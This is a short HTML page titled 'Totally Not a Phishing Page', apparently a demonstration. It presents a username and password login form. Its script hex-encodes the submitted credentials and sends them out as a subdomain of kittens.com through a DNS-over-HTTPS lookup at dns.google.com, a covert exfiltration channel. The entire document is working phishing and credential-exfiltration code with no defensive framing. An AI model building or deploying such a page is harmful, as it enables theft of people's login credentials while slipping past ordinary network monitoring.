<!doctype html>
<html>
        <head><title>Totally Not a Phishing Page</title></head>
        <body>
                <h1>Not a Phishing Page</h1>
                <form action="javascript:submitMe()">
                        <pre>Username</pre><input type=text     id=username><br><br>
                        <pre>Password</pre><input type=password id=password></br>
                        <button type=submitMe >Submit</button>
                </form>
        </body>
        <script>
function submitMe() {
        let b = document.getElementById("username").value +
                "|" + document.getElementById("password").value;
        let h = "";
        for (i=0; i<b.length; i++) {
                hex = b.charCodeAt(i).toString(16);
                h += ("000"+hex).slice(-2);
        }
        document.location = "https://dns.google.com/resolve?type=a&name=" + 
                h + ".kittens.com";
}
        </script>
</html>
